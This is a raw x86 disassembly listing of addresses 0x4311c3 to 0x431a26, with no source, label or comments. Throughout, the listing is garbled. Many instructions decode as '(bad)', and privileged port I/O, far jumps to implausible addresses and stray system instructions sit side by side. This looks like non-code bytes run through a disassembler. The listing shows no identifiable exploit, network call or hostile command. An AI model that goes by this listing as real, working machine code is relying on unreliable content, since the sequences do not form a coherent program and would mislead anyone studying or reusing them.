  4311c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311d4:	dec    edi
  4311d5:	pop    es
  4311d6:	add    ah,ch
  4311d8:	mov    DWORD PTR [ebp+0x68],eax
  4311db:	in     eax,dx
  4311dc:	inc    DWORD PTR [ebp-0x7d]
  4311df:	out    0xc0,al
  4311e1:	inc    ebp
  4311e2:	mov    edx,esp
  4311e4:	push   0x45
  4311e6:	(bad)  
  4311e7:	jmp    0xdf9257a4
  4311ec:	add    BYTE PTR [ebp-0x77],al
  4311ef:	out    dx,al
  4311f0:	ins    BYTE PTR es:[edi],dx
  4311f1:	inc    ebp
  4311f2:	jmp    edi
  4311f4:	add    DWORD PTR [ebp-0x14],0x7e
  4311f8:	mov    esi,esi
  4311fa:	outs   dx,BYTE PTR ds:[esi]
  4311fb:	inc    esp
  4311fc:	(bad)  
  4311fd:	mov    esp,0x8341b68d
  431202:	mov    DWORD PTR [esi+0x70],eax
  431205:	fcos   
  431207:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43120d:	in     al,dx
  43120e:	jb     0x431195
  431210:	(bad)  
  431211:	dec    DWORD PTR [ebx-0x7aba9901]
  431217:	mov    edi,edi
  431219:	fdivr  st,st(7)
  43121b:	out    dx,eax
  43121c:	rcl    BYTE PTR [ebx],0x66
  43121f:	mov    DWORD PTR [ebp-0xc70075],eax
  431225:	(bad)  
  431226:	std    
  431227:	cmp    eax,DWORD PTR [eax]
  431229:	jne    0x431291
  43122b:	mov    DWORD PTR [ebp-0xba0048],eax
  431231:	in     al,dx
  431232:	outs   dx,BYTE PTR ds:[esi]
  431233:	pushf  
  431234:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43123a:	inc    DWORD PTR [ecx]
  43123c:	inc    DWORD PTR [eax]
  43123e:	jae    0x431278
  431240:	add    BYTE PTR [ebp+0x850266],al
  431246:	inc    DWORD PTR [ebp-0x1]
  431249:	mov    eax,eax
  43124b:	jl     0x4312b3
  43124d:	add    BYTE PTR [ebp-0x740077],al
  431253:	cld    
  431254:	dec    eax
  431255:	add    BYTE PTR [eax],0x1
  431258:	data16 add BYTE PTR [ebp+0x38],al
  43125c:	mov    eax,0x47c2
  431261:	mov    eax,0x824f89
  431266:	inc    edi
  431267:	mov    DWORD PTR [edx+0x64],ebp
  43126a:	inc    WORD PTR [ebp-0x75]
  43126e:	(bad)  
  43126f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431276:	inc    ebp
  431277:	jge    0x431258
  431279:	add    bh,ah
  43127b:	lea    ax,[ebp-0x750030]
  431282:	add    al,0x46
  431285:	jmp    0x40ff:0x8885
  43128b:	push   DWORD PTR [ebp+0x52]
  43128e:	lea    eax,[eax]
  431290:	shl    BYTE PTR [esi-0x7b],1
  431293:	test   esi,edi
  431295:	(bad)  
  431296:	(bad)  
  431297:	inc    DWORD PTR [ebp-0x990140]
  43129d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4312a3:	inc    edi
  4312a4:	push   ecx
  4312a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4312ac:	add    al,al
  4312ae:	ret    
  4312af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312b6:	push   eax
  4312b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312be:	add    BYTE PTR [ebx-0x764f8839],al
  4312c4:	push   DWORD PTR [esi+0x1]
  4312c7:	inc    DWORD PTR [eax]
  4312c9:	mov    eax,0xff99ff
  4312ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312d4:	jne    0x43128e
  4312d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312e0:	mov    ecx,0xd74fb8
  4312e5:	add    cl,al
  4312e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312f4:	(bad)  
  4312f5:	push   ebp
  4312f7:	mov    eax,0x8c2789
  4312fc:	ret    0x6689
  4312ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431303:	add    bh,ah
  431305:	mov    WORD PTR [ebp-0x70],ax
  431309:	(bad)  
  43130a:	ret    0x667d
  43130d:	or     BYTE PTR [ebp-0x77],dl
  431310:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431317:	loop   0x4312a2
  431319:	(bad)  
  43131a:	xchg   esi,eax
  43131b:	aam    0xcf
  43131d:	out    dx,al
  43131e:	mov    DWORD PTR [esi-0x68],edi
  431321:	inc    ebp
  431322:	dec    edx
  431323:	pop    ecx
  431324:	mov    edx,DWORD PTR [eax]
  431326:	repnz push bp
  431329:	or     BYTE PTR [ebx+0x55106638],0x49
  431330:	(bad)  
  431331:	repnz xor eax,0xa0898945
  431337:	mov    ah,0x89
  431339:	jmp    DWORD PTR [edx+0x66b0418d]
  43133f:	inc    DWORD PTR [ebp+0x50]
  431342:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431346:	mov    DWORD PTR [eax],ecx
  431348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431349:	pop    es
  43134a:	inc    ecx
  43134b:	(bad)  
  43134c:	data16 fwait
  43134e:	inc    ebp
  43134f:	xor    ah,BYTE PTR [esi+0x3]
  431352:	dec    ebp
  431353:	push   eax
  431354:	inc    bp
  431356:	jge    0x4312db
  431358:	mov    esp,DWORD PTR [esi-0x18]
  43135b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431361:	add    DWORD PTR [ebx],esi
  431363:	add    BYTE PTR [ebx],al
  431365:	test   DWORD PTR [ebx],esi
  431367:	(bad)  
  431368:	inc    WORD PTR [ebp+0x0]
  43136c:	mov    eax,DWORD PTR [eax]
  43136e:	call   0x8898caa3
  431373:	mov    esi,eax
  431375:	clc    
  431376:	ret    
  431377:	rol    cl,0xa
  43137a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431380:	mov    edx,edi
  431382:	pushf  
  431383:	pop    es
  431384:	jmp    FWORD PTR [edx+0x66]
  431387:	add    BYTE PTR [ebp-0x990175],al
  43138d:	inc    ebp
  43138e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431394:	push   ebp
  431395:	mov    edi,eax
  431397:	mov    dh,BYTE PTR [eax+0x266ff51]
  43139d:	push   ebp
  43139e:	add    BYTE PTR [ebx-0x764b0777],al
  4313a4:	dec    DWORD PTR [esi+0x661851e8]
  4313aa:	add    BYTE PTR [ebp-0x7b],dl
  4313ad:	cmp    esi,0xfffffffb
  4313b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4313b6:	jmp    DWORD PTR [esi-0x75]
  4313b9:	push   ebp
  4313ba:	hlt    
  4313bb:	data16 (bad) 
  4313bd:	dec    ebp
  4313be:	ret    
  4313bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313c5:	lea    edx,[eax-0x1]
  4313c8:	jne    0x43139b
  4313ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313d0:	dec    BYTE PTR [ecx+0x51559eff]
  4313d6:	mov    DWORD PTR [esi-0x4c],esp
  4313d9:	push   ebp
  4313da:	jmp    DWORD PTR [esi-0x18]
  4313dd:	inc    ebp
  4313de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313e4:	(bad)  
  4313e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313e6:	inc    eax
  4313e8:	test   DWORD PTR [esi-0x2],esp
  4313eb:	inc    ebp
  4313ec:	dec    DWORD PTR [ebp-0x760bde75]
  4313f2:	(bad)  
  4313f3:	test   al,0xc3
  4313f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313fb:	lods   al,BYTE PTR ds:[esi]
  4313fc:	push   eax
  4313fd:	inc    ebp
  4313fe:	jne    0x43140f
  431400:	dec    DWORD PTR [ebp+0x8]
  431403:	mov    ecx,DWORD PTR [ebx]
  431405:	sbb    al,0x0
  431407:	(bad)  
  431408:	mov    eax,0xc14fc3
  43140d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431413:	movsx  ecx,WORD PTR [ebp+0x4e]
  431417:	xor    eax,DWORD PTR [eax]
  431419:	add    eax,edi
  43141b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431421:	xor    edi,DWORD PTR [eax+0x854f66]
  431427:	dec    BYTE PTR [ecx-0x76bb01]
  43142d:	mov    BYTE PTR [ebx-0x76724001],al
  431433:	pushf  
  431434:	inc    esi
  431435:	(bad)  
  431436:	dec    DWORD PTR [ebp-0x7abe6373]
  43143c:	sar    esi,0x89
  43143f:	dec    DWORD PTR [eax+0x0]
  431442:	inc    DWORD PTR [eax]
  431444:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43144b:	xlat   BYTE PTR ds:[ebx]
  43144c:	dec    edx
  43144d:	add    bh,bh
  43144f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431455:	lea    esp,[esi-0x50]
  431458:	(bad)  
  431459:	(bad)  
  43145a:	call   DWORD PTR [eax-0x1]
  43145d:	inc    ebp
  43145e:	rdpmc  
  431460:	add    BYTE PTR [ebx],al
  431462:	push   ax
  431464:	lea    eax,[ebp-0x1]
  43146a:	js     0x43146b
  43146c:	add    al,bh
  43146e:	push   bp
  431470:	lea    ecx,[ebp-0x7701]
  431476:	fmul   DWORD PTR [ebp-0x7a997800]
  43147c:	(bad)  
  43147d:	(bad)  
  43147e:	(bad)  
  43147f:	(bad)  
  431480:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431486:	dec    eax
  431487:	mov    eax,0x8d8dffff
  43148c:	mov    al,0xb0
  43148e:	(bad)  
  43148f:	call   DWORD PTR [ecx+0x50]
  431492:	dec    ebp
  431493:	inc    ebp
  431494:	mov    esi,0x7030833
  431499:	push   eax
  43149a:	into   
  43149b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4314a1:	call   DWORD PTR [ecx-0x8]
  4314a4:	lea    edx,[ebp-0x1]
  4314a7:	jmp    0x7616ab
  4314ac:	inc    eax
  4314ad:	jnp    0x43143c
  4314af:	add    dh,bh
  4314b1:	inc    WORD PTR [ebp-0x8a00b0]
  4314b8:	mov    edx,eax
  4314ba:	inc    esp
  4314bb:	add    bh,bh
  4314bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314c3:	dec    DWORD PTR [ebx-0x7f820301]
  4314c9:	add    BYTE PTR [ecx],al
  4314cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4314d2:	inc    eax
  4314d4:	(bad)  
  4314d5:	dec    si
  4314d7:	test   edi,edi
  4314d9:	(bad)  
  4314da:	cmp    edi,edi
  4314dc:	add    ecx,DWORD PTR [edi-0x39]
  4314df:	mov    edx,DWORD PTR [edx+0x66]
  4314e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4314e8:	mov    eax,0x66ff8b5e
  4314ee:	jmp    0xb4ff:0xc7ff3895
  4314f5:	push   ecx
  4314f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314fc:	call   DWORD PTR [esi-0x1]
  4314ff:	dec    DWORD PTR [eax]
  431501:	mov    ecx,0x805ff
  431506:	inc    ebp
  431507:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43150d:	mov    ecx,0x35784
  431512:	add    BYTE PTR [ecx-0xffa59b],cl
  431518:	inc    ebp
  431519:	mov    ecx,0x9c6131
  43151e:	(bad)  
  43151f:	mov    eax,ebx
  431521:	pop    esp
  431522:	test   edi,edi
  431524:	clc    
  431525:	lea    eax,[ebp-0x24]
  431528:	cmp    eax,0xc7fe9c8d
  43152d:	push   eax
  43152f:	lea    eax,[ebp+0x45fff8fe]
  431535:	mov    esi,DWORD PTR [ecx]
  431537:	hlt    
  431538:	lahf   
  431539:	push   esp
  43153a:	mov    edx,DWORD PTR [ecx-0x4]
  43153d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431543:	add    BYTE PTR [ebp-0x35],al
  431546:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43154c:	mov    edx,DWORD PTR [ecx-0x74]
  43154f:	rol    BYTE PTR [eax],0x8d
  431552:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431556:	nop
  431557:	push   ecx
  431558:	add    bh,bh
  43155a:	mov    esp,edi
  43155c:	in     al,0x85
  43155e:	jge    0x43155e
  431560:	test   edi,edi
  431562:	jne    0x4314e9
  431564:	(bad)  
  431565:	(bad)  
  431566:	sbb    bh,bh
  431568:	push   ebp
  431569:	inc    ebp
  43156a:	call   0xffdc0ffa
  43156f:	add    BYTE PTR [ebp+0x66],al
  431572:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431578:	cmp    al,0x85
  43157a:	ud0    eax,DWORD PTR [ebp-0x1]
  43157e:	test   DWORD PTR [edi+0x74],ecx
  431581:	dec    edi
  431582:	inc    DWORD PTR [ebp-0x50004]
  431588:	dec    DWORD PTR [edi-0x75]
  43158b:	dec    esi
  43158c:	cld    
  43158d:	test   DWORD PTR [eax+0xff01ff],eax
  431593:	icebp  
  431594:	add    BYTE PTR [edi-0x3a],cl
  431597:	test   ebx,eax
  431599:	inc    BYTE PTR [ebp-0x1]
  43159c:	jne    0x43159e
  43159e:	mov    eax,DWORD PTR [eax]
  4315a0:	cld    
  4315a1:	xor    BYTE PTR [ecx+0x500155],cl
  4315a7:	push   ebp
  4315a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4315b4:	add    al,BYTE PTR [eax]
  4315b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315bc:	add    ah,ch
  4315be:	or     BYTE PTR [ebp+0x4501f845],dh
  4315c4:	jmp    0xdf18ba
  4315c9:	(bad)  
  4315ca:	nop    ecx
  4315cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4315d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4315d6:	mov    eax,edi
  4315d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4315db:	add    eax,0x45fef885
  4315e0:	dec    DWORD PTR [ebx+0x339445]
  4315e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315ec:	dec    DWORD PTR [ebx-0x460f0375]
  4315f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315f3:	add    esi,edi
  4315f5:	add    bh,bh
  4315f7:	rdpmc  
  4315f9:	add    BYTE PTR [ebx],0x1
  4315fc:	mov    DWORD PTR [eax],eax
  4315fe:	add    al,0x45
  431600:	dec    DWORD PTR [ecx-0x360b3373]
  431606:	dec    DWORD PTR [esi]
  431608:	push   eax
  431609:	jne    0x431650
  43160b:	mov    esi,DWORD PTR [ebx]
  43160d:	cld    
  43160e:	add    esp,ecx
  431610:	push   eax
  431611:	inc    DWORD PTR [ebp-0x75]
  431614:	add    eax,0x800e4
  431619:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43161f:	mov    DWORD PTR [ecx],eax
  431621:	sbb    al,0x0
  431623:	leave  
  431624:	test   DWORD PTR [edi-0x2],eax
  431627:	jne    0x431628
  431629:	call   0xff44002e
  43162e:	xor    BYTE PTR [ebp+0x4d],al
  431631:	mov    edi,edi
  431633:	enter  0x8,0x4d
  431637:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43163d:	mov    eax,DWORD PTR [eax]
  43163f:	cld    
  431640:	add    DWORD PTR [ecx],ebx
  431642:	inc    ebp
  431643:	dec    ebp
  431644:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43164a:	inc    eax
  43164b:	dec    DWORD PTR [ecx-0x270375]
  431651:	add    BYTE PTR [ebx-0x39d72701],cl
  431657:	xchg   ecx,eax
  431658:	ret    
  431659:	add    BYTE PTR [ebp-0x830075],al
  43165f:	add    BYTE PTR [ebp-0x75],al
  431662:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431668:	lea    edi,[edi-0xc]
  43166b:	add    bh,bh
  43166d:	mov    edx,DWORD PTR [eax-0x7b]
  431670:	inc    ebp
  431671:	rdpmc  
  431673:	jne    0x431678
  431675:	add    BYTE PTR [eax-0x75],dl
  431678:	inc    ebp
  431679:	clc    
  43167a:	add    eax,0x400009
  43167f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431685:	mov    eax,DWORD PTR [ecx]
  431687:	in     al,dx
  431688:	add    dh,al
  43168a:	test   ebx,eax
  43168c:	inc    BYTE PTR [ebp-0xff0001]
  431692:	add    BYTE PTR [ebp-0x43],al
  431695:	cmp    esi,0xfffffff8
  431698:	(bad)  
  431699:	push   DWORD PTR [eax]
  43169b:	add    BYTE PTR [ebp-0x3a],dl
  43169e:	test   ebx,eax
  4316a0:	je     0x431627
  4316a2:	mov    edi,edi
  4316a4:	sbb    al,0xff
  4316a6:	test   DWORD PTR gs:[eax],eax
  4316a9:	(bad)  
  4316aa:	js     0x4316ab
  4316ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316b2:	sub    eax,ebx
  4316b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ba:	add    eax,DWORD PTR [eax]
  4316bc:	dec    ebp
  4316bd:	push   eax
  4316be:	mov    al,BYTE PTR [ebp+0x1]
  4316c1:	mov    eax,DWORD PTR [ebp-0x68]
  4316c4:	mov    eax,DWORD PTR [eax]
  4316c6:	sbb    bh,al
  4316c8:	or     ah,dh
  4316ca:	dec    ebp
  4316cb:	inc    DWORD PTR [eax+0x4]
  4316ce:	push   ecx
  4316cf:	add    BYTE PTR [edx-0x1],dh
  4316d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316e8:	push   ecx
  4316e9:	cmp    BYTE PTR [ebx],al
  4316eb:	inc    ebp
  4316ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316f2:	(bad)  
  4316f3:	(bad)  
  4316f4:	in     al,0xff
  4316f6:	add    BYTE PTR [ebp+0x0],al
  4316f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316ff:	add    al,bh
  431701:	(bad)  
  431702:	jmp    0x8d85:0x74b0558d
  431709:	dec    DWORD PTR [eax]
  43170b:	call   DWORD PTR [ebp-0x7b]
  43170e:	mov    edi,esi
  431710:	lock call DWORD PTR [ebp-0x75]
  431714:	mov    esi,esp
  431716:	mov    ah,0xc6
  431718:	mov    bh,0xc3
  43171a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431720:	add    DWORD PTR [eax],0x450050ff
  431726:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43172c:	inc    edi
  43172e:	push   esp
  431730:	jmp    0xcd00:0x650481ff
  431737:	mov    DWORD PTR [ebx],esi
  431739:	clc    
  43173a:	cmp    edi,0xff9cff3c
  431740:	jne    0x43174a
  431742:	mov    eax,eax
  431744:	add    esi,DWORD PTR [eax]
  431746:	int3   
  431747:	inc    ebp
  431748:	cmp    al,0x83
  43174a:	add    BYTE PTR [eax],bl
  43174c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431752:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431758:	mov    edi,eax
  43175a:	cmp    BYTE PTR [ebp+0x45],cl
  43175d:	jmp    0x4316ea
  43175f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431762:	inc    ebp
  431763:	or     al,0x2
  431765:	dec    DWORD PTR [ebp+0x18]
  431768:	jne    0x4317bf
  43176a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431770:	mov    edi,DWORD PTR [ebx]
  431772:	in     al,0x50
  431774:	xchg   ecx,eax
  431775:	jmp    0x343667a
  43177a:	adc    al,0x8b
  43177c:	inc    ebp
  43177d:	mov    al,ds:0x8b04008b
  431782:	push   ebp
  431783:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431789:	push   ebp
  43178a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431790:	inc    ebp
  431791:	dec    ebp
  431792:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431798:	mov    DWORD PTR [eax],0xe9ff00f4
  43179e:	add    al,0x0
  4317a0:	add    BYTE PTR [eax],al
  4317a2:	mov    eax,edx
  4317a4:	push   eax
  4317a5:	rol    DWORD PTR [ebp-0xf0177],1
  4317ab:	bound  eax,QWORD PTR [ebp+0x50]
  4317ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ba:	mov    al,0xf
  4317bc:	test   DWORD PTR [edx],edx
  4317be:	call   DWORD PTR [ebp-0x7a0001]
  4317c4:	(bad)  
  4317c5:	loop   0x4317c6
  4317c7:	jnp    0xc6990bcd
  4317cd:	mov    eax,ebx
  4317cf:	cmp    al,0x8b
  4317d1:	(bad)  
  4317d2:	cld    
  4317d3:	shr    esi,0xc
  4317d6:	add    dl,al
  4317d8:	push   eax
  4317d9:	lea    eax,[ebp-0x1]
  4317dc:	mov    edx,esi
  4317de:	cwde   
  4317df:	cli    
  4317e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317e6:	or     BYTE PTR [eax],cl
  4317e8:	inc    ebp
  4317e9:	dec    ebp
  4317ea:	inc    DWORD PTR [ebx+0x74803914]
  4317f0:	add    DWORD PTR [ebx+0x451800],ecx
  4317f6:	call   DWORD PTR [eax+edx*1]
  4317f9:	add    ecx,DWORD PTR [ebp-0x34]
  4317fc:	push   edi
  4317fd:	adc    al,0x8
  4317ff:	mov    edx,DWORD PTR [ebp-0x14]
  431802:	mov    ecx,DWORD PTR [ebp+0x18]
  431805:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431809:	inc    DWORD PTR [eax+esi*8]
  43180c:	inc    ebp
  43180d:	stos   BYTE PTR es:[edi],al
  43180e:	mov    edx,DWORD PTR [ebp-0x4]
  431811:	add    DWORD PTR [ebp-0x1c],eax
  431814:	mov    edx,DWORD PTR [ebp-0x70]
  431817:	cmp    eax,DWORD PTR [eax]
  431819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43181a:	mov    eax,DWORD PTR [eax]
  43181c:	cld    
  43181d:	jae    0x43179f
  43181f:	add    eax,DWORD PTR [ecx]
  431821:	clc    
  431822:	add    BYTE PTR [eax+0x30],dl
  431825:	mov    DWORD PTR [ecx],esi
  431827:	clc    
  431828:	pop    ds
  431829:	inc    ebp
  43182a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431830:	(bad)  
  431831:	push   DWORD PTR [edi]
  431833:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431839:	(bad)  
  43183a:	jae    0x43183b
  43183c:	mov    eax,DWORD PTR [ebp-0x740175]
  431842:	sub    eax,DWORD PTR [eax]
  431844:	add    eax,DWORD PTR [eax]
  431846:	mov    DWORD PTR [ecx+0x5f],eax
  431849:	mov    DWORD PTR [ebx-0x4],ebx
  43184c:	ret    0xff
  43184f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431855:	ret    
  431856:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43185c:	add    BYTE PTR [ebp-0x7d],al
  43185f:	mov    DWORD PTR [eax],eax
  431861:	add    al,0x84
  431863:	inc    DWORD PTR [ecx]
  431865:	lea    eax,[eax]
  431867:	hlt    
  431868:	sar    bh,cl
  43186a:	test   BYTE PTR [eax+0x1],dl
  43186d:	inc    ebp
  43186e:	add    BYTE PTR [ebx],dh
  431870:	test   BYTE PTR [ebx],0x84
  431873:	push   eax
  431874:	add    BYTE PTR [ebp+0x0],al
  431877:	add    eax,0x86
  43187c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431882:	add    BYTE PTR [ecx],al
  431884:	add    BYTE PTR [eax],al
  431886:	mov    esi,0x550030
  43188b:	mov    ecx,DWORD PTR [edi]
  43188d:	cld    
  43188e:	fidiv  DWORD PTR [ebp+0x0]
  431891:	mov    edi,DWORD PTR [ecx]
  431893:	xor    BYTE PTR [eax+eax*1],0x84
  431897:	add    eax,DWORD PTR [eax]
  431899:	sbb    BYTE PTR [eax],al
  43189b:	jne    0x43184e
  43189d:	mov    eax,DWORD PTR [ecx]
  43189f:	sbb    BYTE PTR [eax],al
  4318a1:	mov    DWORD PTR [ebp-0x1],esp
  4318a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318aa:	ret    0xb7fc
  4318ad:	dec    ebp
  4318ae:	or     al,0x89
  4318b0:	dec    ebp
  4318b1:	cld    
  4318b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318b6:	add    edi,esp
  4318b8:	seto   BYTE PTR [esi-0x72ffffff]
  4318bf:	inc    ebp
  4318c0:	adc    al,0x8b
  4318c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318c9:	cmp    DWORD PTR [edi+0x72],edx
  4318cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318d2:	gs cmp al,0x0
  4318d5:	je     0x4318ad
  4318d7:	push   eax
  4318d8:	sar    BYTE PTR [eax],1
  4318da:	mov    bh,0x3e
  4318dc:	push   cs
  4318dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318e3:	add    DWORD PTR [ecx+0x12],ebp
  4318e6:	dec    edx
  4318e7:	(bad)  
  4318e8:	mov    eax,edx
  4318ea:	in     al,dx
  4318eb:	adc    DWORD PTR [ecx],esi
  4318ed:	pop    esi
  4318ee:	inc    ecx
  4318ef:	leave  
  4318f0:	or     DWORD PTR [eax],ebx
  4318f2:	gs push ebp
  4318f4:	add    ah,ch
  4318f6:	into   
  4318f7:	in     al,dx
  4318f8:	enter  0xb756,0xf0
  4318fc:	push   cs
  4318fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431907:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43190d:	jnp    0x74439e15
  431913:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431919:	add    BYTE PTR [edi],cl
  43191b:	mov    edi,DWORD PTR [ecx-0x78]
  43191e:	ltr    WORD PTR [ecx-0x7b]
  431922:	dec    DWORD PTR [edi]
  431924:	clc    
  431925:	out    0x45,eax
  431927:	add    BYTE PTR [eax],cl
  431929:	cmp    ebx,0xffffff8c
  43192c:	jge    0x43192e
  43192e:	jb     0x431940
  431930:	je     0x5219b0
  431936:	pop    edx
  431937:	push   esi
  431938:	mov    ecx,DWORD PTR [edi]
  43193a:	in     al,dx
  43193b:	rol    DWORD PTR [ebp+0x0],1
  43193e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431945:	cmp    DWORD PTR [ecx],0xfffffff0
  431948:	hlt    
  431949:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43194f:	(bad)  
  431951:	push   eax
  431952:	jns    0xb842fdd0
  431958:	lock push cs
  43195a:	ror    edx,0x3
  43195d:	test   BYTE PTR [ecx+0x5500e800],cl
  431963:	dec    eax
  431964:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431968:	(bad)  
  431969:	mov    esi,0x7f33ff5f
  43196e:	inc    eax
  43196f:	test   DWORD PTR [edx],eax
  431971:	je     0x431933
  431973:	mov    ecx,ecx
  431975:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431979:	and    eax,DWORD PTR [eax+0xf0103]
  43197f:	jp     0x43196d
  431981:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431985:	add    edx,DWORD PTR [edi+0x74]
  431988:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43198e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431994:	je     0x431919
  431996:	cmp    eax,edi
  431998:	js     0x4319bd
  43199a:	add    eax,0xeb0fc003
  43199f:	jns    0x43192c
  4319a1:	vmread DWORD PTR [ecx+0x45],ebx
  4319a5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319ab:	adc    al,0x8b
  4319ad:	jge    0x4319c3
  4319af:	mov    edi,DWORD PTR [eax-0x4]
  4319b2:	add    edi,DWORD PTR [edi]
  4319b4:	or     bh,bh
  4319b6:	push   ebp
  4319b7:	push   es
  4319b8:	mov    DWORD PTR [ebp-0x4],ebx
  4319bb:	add    edi,esi
  4319bd:	pop    es
  4319be:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319c4:	mov    DWORD PTR [esp+esi*8],ecx
  4319c7:	inc    ebp
  4319c8:	pop    ebp
  4319c9:	xor    DWORD PTR [esi-0x4],0x3b
  4319cd:	add    edx,DWORD PTR [ecx+edi*1]
  4319d0:	push   es
  4319d1:	clc    
  4319d2:	mov    bh,0xdb
  4319d4:	jp     0x43198d
  4319d6:	add    cl,BYTE PTR [esi]
  4319d8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319de:	test   edi,edi
  4319e0:	je     0x4319d6
  4319e2:	mov    eax,ecx
  4319e4:	or     BYTE PTR [ebx],al
  4319e6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319ec:	jbe    0x431a60
  4319ee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319f4:	add    ecx,DWORD PTR [esi]
  4319f6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319fc:	add    eax,DWORD PTR [ebx-0x287af783]
  431a02:	je     0x431a51
  431a04:	mov    DWORD PTR [ecx],edi
  431a06:	mov    esi,eax
  431a08:	hlt    
  431a09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a10:	jb     0x4319d2
  431a12:	jmp    0x4319ff
  431a14:	xor    esi,DWORD PTR [ebx]
  431a16:	pop    edi
  431a17:	pop    esi
  431a18:	pop    ebx
  431a19:	ret    
  431a1a:	ret    0x8b
  431a1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a23:	xor    DWORD PTR [ecx],0xc
  431a26:	pushf  
